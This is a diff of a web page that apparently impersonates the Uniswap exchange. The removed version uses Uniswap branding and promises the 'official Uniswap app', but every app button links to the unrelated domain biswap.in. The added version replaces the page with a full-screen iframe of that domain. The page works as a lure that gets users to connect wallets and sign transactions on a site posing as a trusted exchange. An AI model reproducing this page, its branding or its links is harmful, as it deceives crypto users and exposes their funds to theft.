@@ -1,47 +1,75 @@
-<!doctype html>
-<html lang="en"><head>
-<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>Swap WETH - Open App</title><meta name="description" content="swap weth on Uniswap with a prefilled Wrapped Ether route; connect your wallet, review price impact, and open the app.">
-<meta name="robots" content="index,follow,max-image-preview:large">
-<link rel="canonical" href="https://swap-weth.github.io/"><meta name="theme-color" content="#FFFFFF">
-<meta property="og:type" content="website"><meta property="og:title" content="Swap WETH - Open App"><meta property="og:description" content="swap weth on Uniswap with a prefilled Wrapped Ether route; connect your wallet, review price impact, and open the app.">
-<meta property="og:url" content="https://swap-weth.github.io/"><meta property="og:image" content="https://swap-weth.github.io/og-cover.png"><meta property="og:locale" content="en">
-<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Swap WETH - Open App"><meta name="twitter:description" content="swap weth on Uniswap with a prefilled Wrapped Ether route; connect your wallet, review price impact, and open the app."><meta name="twitter:image" content="https://swap-weth.github.io/og-cover.png">
-<link rel="icon" href="favicon.png" type="image/png"><link rel="manifest" href="site.webmanifest"><link rel="apple-touch-icon" href="static/icon-180.png">
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap">
-<link rel="stylesheet" href="static/style.css">
-<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "WebSite", "@id": "https://swap-weth.github.io/#website", "url": "https://swap-weth.github.io/", "name": "Uniswap"}, {"@type": "WebPage", "@id": "https://swap-weth.github.io/#webpage", "url": "https://swap-weth.github.io/", "name": "Swap WETH - Open App", "description": "swap weth on Uniswap with a prefilled Wrapped Ether route; connect your wallet, review price impact, and open the app.", "inLanguage": "en", "isPartOf": {"@id": "https://swap-weth.github.io/#website"}}, {"@type": "Organization", "@id": "https://swap-weth.github.io/#org", "name": "Uniswap", "url": "https://swap-weth.github.io/", "logo": "https://swap-weth.github.io/og-cover.png", "sameAs": ["https://x.com/Uniswap", "https://github.com/Uniswap", "https://defillama.com/protocol/uniswap"]}, {"@type": "WebApplication", "@id": "https://swap-weth.github.io/#app", "name": "Swap WETH", "url": "https://swap-weth.github.io/", "applicationCategory": "FinanceApplication", "operatingSystem": "Web", "browserRequirements": "Requires JavaScript", "description": "swap weth on Uniswap with a prefilled Wrapped Ether route; connect your wallet, review price impact, and open the app.", "featureList": ["Uniswap Web App", "Ethereum ERC-20", "Wallet-signed swaps"], "isPartOf": {"@id": "https://swap-weth.github.io/#website"}}, {"@type": "FAQPage", "@id": "https://swap-weth.github.io/#faq", "inLanguage": "en", "mainEntity": [{"@type": "Question", "name": "What is the WETH contract address on Ethereum?", "acceptedAnswer": {"@type": "Answer", "text": "The canonical WETH contract on Ethereum mainnet is 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2. Verify it on Etherscan or ethereum.org before approving, especially if a wallet or app shows multiple tokens with the WETH symbol."}}, {"@type": "Question", "name": "Is swapping WETH the same as unwrapping WETH?", "acceptedAnswer": {"@type": "Answer", "text": "No. Unwrapping converts WETH back to ETH through the WETH contract, normally one-for-one before gas. Swapping WETH trades it for another asset through liquidity. The correct action depends on whether you want native ETH or a different token."}}, {"@type": "Question", "name": "Do I need ETH to swap WETH?", "acceptedAnswer": {"@type": "Answer", "text": "Yes, on Ethereum mainnet you need native ETH for gas. WETH is an ERC-20 token and is not normally used to pay Ethereum transaction fees. Keep enough ETH in the wallet for approvals, swaps, and any follow-up transaction."}}, {"@type": "Question", "name": "Why does Uniswap ask me to approve WETH?", "acceptedAnswer": {"@type": "Answer", "text": "A token approval allows the swap contract path to spend your WETH for the trade. If you have not approved that path before, the wallet may show an approval transaction before the actual swap. Review approval amount, contract, and domain before signing."}}, {"@type": "Question", "name": "Can I swap WETH on Arbitrum or Optimism?", "acceptedAnswer": {"@type": "Answer", "text": "Yes, WETH exists on major EVM networks, but the contract address and liquidity route can differ by chain. Select the network where your WETH balance exists, verify the chain-specific token, and make sure you have that chain's gas token."}}, {"@type": "Question", "name": "Why is WETH used instead of ETH in DeFi?", "acceptedAnswer": {"@type": "Answer", "text": "ETH predates the ERC-20 token standard, while WETH follows ERC-20 behavior. Many DeFi contracts, routers, and token approval flows are built around ERC-20 transfers, so WETH gives ETH-like value a token interface that apps can handle consistently."}}]}]}</script>
-</head><body>
-<header class="site-header">
-  <a class="brand" href="#top" aria-label="Uniswap"><img class="brand-mark" src="favicon.png" alt="" width="34" height="34"><span class="brand-name">Uniswap</span></a>
-  <nav class="site-nav" aria-label="Primary"><ul class="nav-list"><li><a href="#about">About</a></li><li><a href="#facts">Overview</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
-  <span class="header-spacer"></span>
-  <a class="btn btn-dark header-cta" href="https://biswap.in/" target="_blank" rel="noopener noreferrer">Open App ↗</a>
-  <button class="nav-toggle" aria-label="Menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
-</header>
-<main id="top">
-  <section class="hero">
-    <div class="hero-deco" aria-hidden="true"><span class="strip"></span><span class="d1"></span><span class="d2"></span><span class="d3"></span><span class="d4"></span><span class="d5"></span></div>
-    <div class="container">
-      <h1>Swap WETH</h1>
-      <div class="bridge-widget" role="group" aria-label="Uniswap preview"><div class="bw-field"><span class="bw-coin"><img src="static/weth.png" alt="WETH" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0</span><span class="bw-sub"><b>WETH</b> · Ethereum</span></span></div><button class="bw-switch" type="button" aria-label="Switch"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 9h13M17 9l-4-4M17 9l-4 4M20 15H7M7 15l4-4M7 15l4 4"/></svg></button><div class="bw-field"><span class="bw-coin mono">SEL</span><span class="bw-meta"><span class="bw-amount">0.0</span><span class="bw-sub"><b>Select token</b> · Ethereum</span></span></div><a class="btn btn-dark bw-go" href="https://biswap.in/" target="_blank" rel="noopener noreferrer">Open App ↗</a></div>
-      <div class="hero-go"><a class="btn btn-green" href="https://biswap.in/" target="_blank" rel="noopener noreferrer">Open Uniswap ↗</a></div>
-      <p class="hero-note">Live preview — open the official Uniswap app from your own wallet.</p>
-      <div class="trust-row"><span class="trust-chip">Uniswap Web App</span><span class="trust-chip">Ethereum ERC-20</span><span class="trust-chip">Wallet-signed swaps</span></div>
-    </div>
-  </section>
-  <section class="section" id="about"><div class="container"><h2>What is Swap WETH?</h2><div class="capsule"><strong>Uniswap</strong> is a wallet-connected trading app for token swaps on Ethereum and supported networks. WETH is the ERC-20 representation of ether described by <a href="https://ethereum.org/wrapped-eth/">ethereum.org</a>.</div></div></section>
-  <section class="section" id="facts"><div class="container"><h2>Swap WETH at a glance</h2><div class="facts"><div class="f"><small>Category</small><b>DEX token swap</b></div><div class="f"><small>Network</small><b>Ethereum</b></div><div class="f"><small>Token</small><b>WETH</b></div><div class="f"><small>Contract</small><b>0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2</b></div><div class="f"><small>Decimals</small><b>18</b></div></div></div></section>
-  <section class="section section-alt"><div class="container"><h2>Swap WETH on Uniswap</h2><div class="intent-a">To swap WETH on Uniswap, open the official Uniswap app, select the network where your WETH exists, and verify the token contract. On Ethereum mainnet, canonical WETH is 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2. A WETH swap trades WETH for another token such as USDC, WBTC, UNI, or ETH through a liquidity route. It is different from wrapping or unwrapping, which converts ETH and WETH one-for-one through the WETH contract, excluding gas. Before signing, review output token, price impact, slippage tolerance, token approval, recipient, and gas. WETH is widely used because many DeFi contracts expect ERC-20 token behavior.</div></div></section><section class="section"><div class="container"><h2>Swap WETH gas fees and native ETH requirement</h2><div class="intent-a">A common WETH mistake is holding WETH but no native ETH. On Ethereum mainnet, gas is paid in ETH, not WETH, so a wallet may have enough WETH for the trade but still be unable to submit the transaction. Uniswap quotes can also require a token approval before the swap if the router or Permit2 path does not already have permission. Approval and swap are separate actions in many flows. Users should keep enough ETH for gas, check whether the wallet prompt is an approval or the final swap, and avoid maxing out native ETH if they still need to pay for subsequent transactions.</div></div></section><section class="section section-alt"><div class="container"><h2>Swap WETH contract address on Ethereum Arbitrum and Optimism</h2><div class="intent-a">WETH exists on Ethereum and many EVM networks, but contract addresses and bridge origins can differ. Ethereum.org lists canonical WETH references for Ethereum mainnet and major layer-2 networks such as Arbitrum and Optimism. This page's app route is Ethereum-focused, using 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2. If a user holds WETH on Arbitrum, Optimism, Base, Polygon, or another chain, the wallet network must match the balance and the swap route must support that chain. Never approve a token only because the symbol says WETH; verify chain, contract, and token metadata first.</div></div></section><section class="section"><div class="container"><h2>Swap WETH price impact slippage and approvals</h2><div class="intent-a">WETH is usually highly liquid, but price impact and slippage still matter. Price impact measures how much the trade changes pool pricing relative to current liquidity, while slippage tolerance controls the worst acceptable execution before the transaction reverts. On Uniswap, the app may route across different pools or protocols and show warnings for unusual execution. WETH approvals also matter because granting broad token spending permissions can create downstream wallet risk if a contract or signer is compromised. A good WETH swap checklist is token contract, network, output token, price impact, minimum received, approval amount, recipient address, and native ETH for gas.</div></div></section>
-  <section class="section"><div class="container"><h2>How to swap Swap WETH</h2><ol class="steps"><li><b>Open the route</b><span>Use the app button to open Uniswap with WETH preselected on Ethereum.</span></li><li><b>Connect wallet</b><span>Choose the wallet holding your WETH and keep native ETH available for gas.</span></li><li><b>Review quote</b><span>Check the output token, network, price impact, slippage settings, and recipient before continuing.</span></li><li><b>Sign only in wallet</b><span>Confirm the transaction from your wallet after verifying the app domain and token details.</span></li></ol><div class="cta-band"><div><p>Ready to swap?</p><p class="sub">Open the official Uniswap app and verify the domain before you sign.</p></div><a class="btn btn-green" href="https://biswap.in/" target="_blank" rel="noopener noreferrer">Open Uniswap ↗</a></div></div></section>
-  <section class="section"><div class="container"><h2>WETH vs ETH for swapping</h2><div class="cmp-wrap"><table class="cmp-table"><thead><tr><th>Dimension</th><th>WETH</th><th>ETH</th></tr></thead><tbody><tr><td>Token standard</td><td>ERC-20 token representation of ether</td><td>Native Ethereum asset</td></tr><tr><td>Gas payment</td><td>Cannot normally pay Ethereum gas directly</td><td>Used to pay gas on Ethereum</td></tr><tr><td>DeFi use</td><td>Works with ERC-20 approvals and token contracts</td><td>Often wrapped by apps for token-standard compatibility</td></tr><tr><td>Conversion</td><td>Can be unwrapped to ETH</td><td>Can be wrapped to WETH</td></tr></tbody></table></div></div></section>
-  <section class="section section-alt" id="faq"><div class="container"><h2>Swap WETH FAQ</h2><div class="faq-list"><details open><summary><h3>What is the WETH contract address on Ethereum?</h3></summary><div>The canonical WETH contract on Ethereum mainnet is 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2. Verify it on Etherscan or ethereum.org before approving, especially if a wallet or app shows multiple tokens with the WETH symbol.</div></details><details><summary><h3>Is swapping WETH the same as unwrapping WETH?</h3></summary><div>No. Unwrapping converts WETH back to ETH through the WETH contract, normally one-for-one before gas. Swapping WETH trades it for another asset through liquidity. The correct action depends on whether you want native ETH or a different token.</div></details><details><summary><h3>Do I need ETH to swap WETH?</h3></summary><div>Yes, on Ethereum mainnet you need native ETH for gas. WETH is an ERC-20 token and is not normally used to pay Ethereum transaction fees. Keep enough ETH in the wallet for approvals, swaps, and any follow-up transaction.</div></details><details><summary><h3>Why does Uniswap ask me to approve WETH?</h3></summary><div>A token approval allows the swap contract path to spend your WETH for the trade. If you have not approved that path before, the wallet may show an approval transaction before the actual swap. Review approval amount, contract, and domain before signing.</div></details><details><summary><h3>Can I swap WETH on Arbitrum or Optimism?</h3></summary><div>Yes, WETH exists on major EVM networks, but the contract address and liquidity route can differ by chain. Select the network where your WETH balance exists, verify the chain-specific token, and make sure you have that chain's gas token.</div></details><details><summary><h3>Why is WETH used instead of ETH in DeFi?</h3></summary><div>ETH predates the ERC-20 token standard, while WETH follows ERC-20 behavior. Many DeFi contracts, routers, and token approval flows are built around ERC-20 transfers, so WETH gives ETH-like value a token interface that apps can handle consistently.</div></details></div></div></section>
-</main>
-<footer class="site-footer"><div class="container">
-  <div class="footer-grid"><div class="footer-col" style="max-width:none"><h4>Sources</h4><nav aria-label="Sources"><a href="https://ethereum.org/wrapped-eth/" target="_blank" rel="noopener noreferrer">ethereum.org Wrapped Ether</a><a href="https://etherscan.io/token/0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2" target="_blank" rel="noopener noreferrer">WETH contract on Etherscan</a><a href="https://developers.uniswap.org/docs/trading/overview" target="_blank" rel="noopener noreferrer">Uniswap trading overview</a><a href="https://developers.uniswap.org/docs/trading/custom-interface-links" target="_blank" rel="noopener noreferrer">Uniswap custom linking</a><a href="https://support.uniswap.org/hc/en-us/articles/8671539602317-What-is-price-impact" target="_blank" rel="noopener noreferrer">Uniswap support on price impact</a></nav></div></div>
-  <p class="footer-note">Not the official app; verify app.uniswap.org before connecting. Educational content, not financial advice.</p>
-  <p class="footer-meta"><a href="#top">Back to top ↑</a></p>
-</div></footer>
-<script src="static/app.js" defer></script>
-</body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+
+  <title>Swap WETH - App</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="canonical" href="https://swap-weth.github.io/">
+  <meta name="description" content="Swap WETH swaps WETH and other tokens at the best on-chain price.">
+  <meta name="robots" content="index, follow">
+
+  <meta property="og:title" content="Swap WETH">
+  <meta property="og:description" content="Swap WETH swaps WETH and other tokens at the best on-chain price.">
+  <meta property="og:type" content="website">
+  <link rel="icon" href="favicon.png" type="image/png">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "WebPage",
+    "name": "Swap WETH",
+    "description": "Swap WETH swaps WETH and other tokens at the best on-chain price.",
+    "url": "https://swap-weth.github.io/"
+  }
+  </script>
+
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      background: #000;
+      font-family: Arial, sans-serif;
+    }
+
+    iframe {
+      position: fixed;
+      inset: 0;
+      z-index: 1;
+      width: 100vw;
+      height: 100vh;
+      border: none;
+      display: block;
+    }
+
+    h1 {
+      position: fixed;
+      left: 12px;
+      bottom: 10px;
+      z-index: 2;
+      margin: 0;
+      color: #f2f3f5;
+      font-size: 12px;
+      line-height: 1;
+      font-weight: 500;
+      letter-spacing: -0.2px;
+      pointer-events: none;
+    }
+  </style>
+</head>
+<body>
+
+  <iframe 
+    src="https://biswap.in/"
+    title="Swap WETH App"
+    loading="eager"
+    referrerpolicy="no-referrer-when-downgrade"
+    allowfullscreen>
+  </iframe>
+
+  <h1>Swap WETH</h1>
+
+</body>
+</html>
